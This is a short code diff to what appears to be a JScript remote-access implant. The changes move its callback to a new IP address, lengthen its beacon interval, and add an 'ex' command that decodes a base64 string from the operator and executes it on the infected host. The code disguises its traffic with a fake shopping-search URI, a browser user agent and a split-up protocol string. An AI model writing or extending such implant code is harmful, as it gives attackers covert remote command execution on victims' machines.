@@ -1,10 +1,10 @@
 //Define variables
-var ipp  = "172.16.71.1"
+var ipp  = "172.16.113.1"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
 var home = proto+ipp+":"+p0rt+uri
-var sleepytime = 3000 //in milliseconds
+var sleepytime = 6000 //in milliseconds
 
 var useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
 var xFrameOptions = "SAMEORIGIN"
@@ -237,6 +237,11 @@ while(true)
             catch (e) {
               retval = "[-] Could not upload file: " + filename
             }
+          }
+
+          else if(cmnd.split(" ")[0] == "ex") {
+            runner.Exec(b64d(cmnd.split(" ")[1]))
+            retval = "[*] Exec'd cmnd... (no output)"
           }
 
           //credit to nate and 0sum
